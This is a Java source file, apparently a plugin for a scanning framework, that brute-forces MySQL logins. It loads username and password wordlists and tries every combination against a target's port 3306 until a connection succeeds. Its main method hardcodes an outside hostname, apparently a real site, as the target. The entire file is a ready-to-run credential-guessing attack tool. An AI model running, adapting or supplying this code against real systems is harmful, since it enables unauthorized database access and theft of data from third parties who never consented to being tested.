package cn.com.sgcc.marki_with_maven.modules;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class MysqlBrute implements IPocBase {

	@Override
	public Map info() {
		// TODO Auto-generated method stub
		Map info = new HashMap<String, Object>();
		info.put("name", "MysqlBrute");
		return info;
	}

	@Override
	public boolean match(Map infodict) {
		// TODO Auto-generated method stub
		boolean ismatch = false;
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		if ( serviceVersion.toLowerCase().contains("mysql") || Integer.valueOf(port) == 3306)
		{
			ismatch = true;
		}
		return ismatch;
	}

	@Override
	public boolean verify(Map infodict) {
		// TODO Auto-generated method stub
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		boolean success = false;
		try {
			Class.forName("com.mysql.jdbc.Driver").newInstance();
			String url = "jdbc:mysql://"+ip+":"+port+"/mysql";  
		    
		    
		    BufferedReader brUserName = new BufferedReader(new InputStreamReader(new FileInputStream(new File("data/mysql-username.txt"))));
			BufferedReader brPassWord = new BufferedReader(new InputStreamReader(new FileInputStream(new File("data/mysql-password.txt"))));
			ArrayList<String> userNames = new ArrayList<String>();
			ArrayList<String> passWords = new ArrayList<String>();
			String tmpuserName = "";
			String tmppassWord = "";
			while( (tmpuserName = brUserName.readLine() ) != null)
			{
				userNames.add(tmpuserName);
			}
			while(  (tmppassWord = brPassWord.readLine()) != null )
			{
				passWords.add(tmppassWord);
			}
			
			boolean isBreak = false;
			for(String userName : userNames)
			{
				if (isBreak )
					break;
				for (String passWord : passWords)
				{
					System.out.println(String.format("Testing Mysql %s,%s", userName, passWord));
					try
					{
						Connection conn = DriverManager.getConnection(url, userName, passWord);
						if(conn !=null)
						{
							success = true;
							isBreak = true;
							break;
						}
					}
					catch(Exception e)
					{
						;
					}
				}
			}
		} catch (InstantiationException | IllegalAccessException | ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}  catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}  
		return success;
	}

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		Map infodict = new HashMap<String, String>();
		infodict.put("ip", "www.hnxjln.com");
		infodict.put("port", "3306");
		infodict.put("service_type", "mysql");
		infodict.put("service_version", "mysql");
		System.out.println(new MysqlBrute().verify(infodict));
	}

}
